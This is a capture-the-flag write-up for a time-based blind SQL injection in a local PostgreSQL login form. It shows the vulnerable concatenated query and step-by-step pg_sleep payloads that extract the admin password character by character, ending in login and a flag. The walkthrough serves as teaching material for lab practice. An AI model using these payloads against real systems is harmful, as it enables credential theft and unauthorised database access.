# Vulnerability 3: Time-Based Blind SQL Injection

## Vulnerability Description
A time-based blind SQL injection vulnerability exists in the login endpoint. The application directly concatenates user input into the SQL query without sanitization or parameterization.

## Affected Endpoint
- **URL**: `http://localhost:5000/login`
- **Method**: POST
- **Parameters**: `username` (vulnerable), `password`

## Vulnerable Code
```python
query = f"SELECT password FROM users WHERE username = '{username}'"
cur.execute(query)

Root Cause
The username parameter is directly inserted into the SQL query using string concatenation. No input validation, sanitization, or parameterized queries are used.

Exploitation Steps
Step 1: Confirm Vulnerability
In the login page, enter the following in the Username field:


admin' AND (SELECT pg_sleep(5) FROM pg_sleep(5)) IS NOT NULL AND '1'='1
Password field: anything (e.g., test)

Observation: The page takes 5 seconds to respond → Vulnerability confirmed.

Step 2: Find Password Length
In the Username field, enter:


admin' AND (SELECT pg_sleep(5) FROM pg_sleep(5) WHERE LENGTH(password)=11) IS NOT NULL AND '1'='1
Observation: 5-second delay → Password length is 11 characters.

Step 3: Extract First Character
Test each character in the Username field:


admin' AND (SELECT pg_sleep(5) FROM pg_sleep(5) WHERE SUBSTRING(password,1,1)='a') IS NOT NULL AND '1'='1
No delay → 'a' is wrong


admin' AND (SELECT pg_sleep(5) FROM pg_sleep(5) WHERE SUBSTRING(password,1,1)='b') IS NOT NULL AND '1'='1
No delay → 'b' is wrong

Continue testing until you find the correct character:


admin' AND (SELECT pg_sleep(5) FROM pg_sleep(5) WHERE SUBSTRING(password,1,1)='s') IS NOT NULL AND '1'='1
5-second delay → First character is 's'

Step 4: Extract Second Character

admin' AND (SELECT pg_sleep(5) FROM pg_sleep(5) WHERE SUBSTRING(password,2,1)='u') IS NOT NULL AND '1'='1
5-second delay → Second character is 'u'

Step 5: Extract Third Character

admin' AND (SELECT pg_sleep(5) FROM pg_sleep(5) WHERE SUBSTRING(password,3,1)='p') IS NOT NULL AND '1'='1
5-second delay → Third character is 'p'

Step 6: Extract Fourth Character

admin' AND (SELECT pg_sleep(5) FROM pg_sleep(5) WHERE SUBSTRING(password,4,1)='e') IS NOT NULL AND '1'='1
5-second delay → Fourth character is 'e'

Step 7: Extract Fifth Character

admin' AND (SELECT pg_sleep(5) FROM pg_sleep(5) WHERE SUBSTRING(password,5,1)='r') IS NOT NULL AND '1'='1
5-second delay → Fifth character is 'r'

Step 8: Extract Sixth Character

admin' AND (SELECT pg_sleep(5) FROM pg_sleep(5) WHERE SUBSTRING(password,6,1)='s') IS NOT NULL AND '1'='1
5-second delay → Sixth character is 's'

Step 9: Extract Seventh Character

admin' AND (SELECT pg_sleep(5) FROM pg_sleep(5) WHERE SUBSTRING(password,7,1)='e') IS NOT NULL AND '1'='1
5-second delay → Seventh character is 'e'

Step 10: Extract Eighth Character

admin' AND (SELECT pg_sleep(5) FROM pg_sleep(5) WHERE SUBSTRING(password,8,1)='c') IS NOT NULL AND '1'='1
5-second delay → Eighth character is 'c'

Step 11: Extract Ninth Character

admin' AND (SELECT pg_sleep(5) FROM pg_sleep(5) WHERE SUBSTRING(password,9,1)='r') IS NOT NULL AND '1'='1
5-second delay → Ninth character is 'r'

Step 12: Extract Tenth Character

admin' AND (SELECT pg_sleep(5) FROM pg_sleep(5) WHERE SUBSTRING(password,10,1)='e') IS NOT NULL AND '1'='1
5-second delay → Tenth character is 'e'

Step 13: Extract Eleventh Character

admin' AND (SELECT pg_sleep(5) FROM pg_sleep(5) WHERE SUBSTRING(password,11,1)='t') IS NOT NULL AND '1'='1
5-second delay → Eleventh character is 't'

Step 14: Complete Password
The extracted password is: supersecret

Step 15: Login as Admin
In the login page, enter:

Username: admin

Password: supersecret

Click Login.

Step 16: Capture Flag
After successful login, the admin dashboard displays:

FLAG{postgres_time_based_blind_sqli}


Payload Explanation
Example payload used:


admin' AND (SELECT pg_sleep(5) FROM pg_sleep(5) WHERE SUBSTRING(password,1,1)='s') IS NOT NULL AND '1'='1
Part	Purpose
admin'	Closes the username string
AND	Adds additional condition to the query
(SELECT pg_sleep(5) FROM pg_sleep(5) WHERE SUBSTRING(password,1,1)='s')	Causes 5-second delay if the first character of password is 's'
IS NOT NULL	Ensures the subquery returns a boolean value
AND '1'='1	Makes the entire WHERE clause always true

Impact
Full database read access

Credential theft (admin password: supersecret)

Credit card data exposure

Account takeover (admin account compromised)

Confidentiality breach

Flag:

FLAG{postgres_time_based_blind_sqli}

